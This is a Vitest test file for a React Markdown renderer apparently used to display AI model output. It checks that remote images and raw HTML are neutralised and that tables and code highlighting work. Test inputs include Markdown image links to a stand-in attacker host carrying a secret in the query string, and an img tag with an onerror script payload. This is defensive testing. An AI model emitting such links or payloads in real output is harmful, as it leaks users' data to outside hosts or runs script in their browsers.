import { createElement } from "react"
import { renderToReadableStream, renderToStaticMarkup } from "react-dom/server"
import { describe, expect, it } from "vitest"
import { ModelMarkdown } from "./model-markdown"

async function renderWhenReady(content: string) {
  const stream = await renderToReadableStream(
    createElement(ModelMarkdown, { content })
  )
  await stream.allReady
  return new Response(stream).text()
}

describe("model Markdown", () => {
  it("does not load remote images, including reference images", () => {
    const html = renderToStaticMarkup(
      createElement(ModelMarkdown, {
        content:
          "![data](https://attacker.example/image?secret=value)\n\n![reference][image]\n\n[image]: https://attacker.example/reference",
      })
    )
    expect(html).not.toContain("<img")
    expect(html).not.toContain("attacker.example")
  })
  it("keeps raw HTML inert and preserves ordinary Markdown links", () => {
    const html = renderToStaticMarkup(
      createElement(ModelMarkdown, {
        content:
          '<img src="https://attacker.example/pixel" onerror="alert(1)">\n\n[Docs](https://docs.example)',
      })
    )
    expect(html).not.toContain("<img")
    expect(html).toContain('href="https://docs.example"')
    expect(html).toContain('rel="noopener noreferrer"')
  })
  it("renders tables and fenced code", () => {
    const html = renderToStaticMarkup(
      createElement(ModelMarkdown, {
        content: "| a | b |\n|---|---|\n| 1 | 2 |\n\n```ts\nconst x = 1\n```",
      })
    )
    expect(html).toContain("<table")
    expect(html).toContain("<pre")
  })

  it("highlights fenced code that has a known language", async () => {
    const html = await renderWhenReady("```ts\nconst x = 1\n```")
    expect(html).toContain('<span class="text-code-keyword">const</span>')
    expect(html).toContain('<span class="text-code-number">1</span>')
  })

  it("resolves language aliases", async () => {
    const html = await renderWhenReady('```sh\necho "hi"\n```')
    expect(html).toContain(
      '<span class="text-code-string">&quot;hi&quot;</span>'
    )
  })

  it("renders fenced code without a language as plain code", async () => {
    const html = await renderWhenReady("```\nconst x = 1\n```")
    expect(html).toContain("<pre")
    expect(html).toContain("<code>const x = 1\n</code>")
    expect(html).not.toContain("text-code-")
    expect(html).not.toContain("bg-muted px-1")
  })

  it("renders fenced code with an unknown language as plain code", async () => {
    const html = await renderWhenReady("```brainfuck\n+++[->+<]\n```")
    expect(html).toContain("+++[-&gt;+&lt;]")
    expect(html).not.toContain("text-code-")
  })

  it("keeps inline code unhighlighted", async () => {
    const html = await renderWhenReady("use `const x = 1` here")
    expect(html).toContain("bg-muted px-1")
    expect(html).not.toContain("text-code-")
  })
})
